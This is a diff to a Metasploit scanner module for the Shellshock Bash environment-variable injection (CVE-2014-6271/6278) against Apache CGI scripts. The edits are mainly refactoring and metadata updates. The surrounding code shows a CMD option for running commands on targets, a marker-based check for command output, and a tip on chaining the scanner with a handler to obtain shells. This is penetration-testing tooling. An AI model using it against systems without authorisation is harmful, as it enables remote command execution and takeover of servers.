@@ -1,23 +1,21 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'Apache mod_cgi Bash Environment Variable RCE Scanner',
+      'Name' => 'Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner',
       'Description' => %q{
-        This module exploits a code injection in specially crafted environment
-        variables in Bash, specifically targeting Apache mod_cgi scripts through
-        the HTTP_USER_AGENT variable by default.
+        This module scans for the Shellshock vulnerability, a flaw in how the Bash shell
+        handles external environment variables. This module targets CGI scripts in the
+        Apache web server by setting the HTTP_USER_AGENT environment variable to a
+        malicious function definition.
 
         PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your
         CMD, set ExitOnSession false, run -j, and then run this module to create
@@ -33,15 +31,16 @@ class Metasploit4 < Msf::Auxiliary
         'lcamtuf' # CVE-2014-6278
       ],
       'References' => [
-        ['CVE', '2014-6271'],
-        ['CVE', '2014-6278'],
-        ['OSVDB', '112004'],
-        ['EDB', '34765'],
-        ['URL', 'https://access.redhat.com/articles/1200223'],
-        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
+        [ 'CVE', '2014-6271' ],
+        [ 'CVE', '2014-6278' ],
+        [ 'OSVDB', '112004' ],
+        [ 'EDB', '34765' ],
+        [ 'URL', 'https://access.redhat.com/articles/1200223' ],
+        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ]
       ],
-      'DisclosureDate' => 'Sep 24 2014',
-      'License' => MSF_LICENSE
+      'DisclosureDate' => '2014-09-24',
+      'License' => MSF_LICENSE,
+      'Notes' => {'AKA' => ['Shellshock']}
     ))
 
     register_options([
@@ -52,7 +51,7 @@ class Metasploit4 < Msf::Auxiliary
         '/usr/bin/id']),
       OptEnum.new('CVE', [true, 'CVE to check/exploit', 'CVE-2014-6271',
         ['CVE-2014-6271', 'CVE-2014-6278']])
-    ], self.class)
+    ])
   end
 
   def check_host(ip)
@@ -92,7 +91,7 @@ class Metasploit4 < Msf::Auxiliary
     res = req(datastore['CMD'], datastore['CVE'])
 
     if res && res.body =~ /#{marker}(.+)#{marker}/m
-      print_good("#{peer} - #{$1}")
+      print_good("#{$1}")
       report_vuln(
         :host => ip,
         :port => rport,
@@ -130,5 +129,4 @@ class Metasploit4 < Msf::Auxiliary
   def marker
     @marker ||= Rex::Text.rand_text_alphanumeric(rand(42) + 1)
   end
-
 end
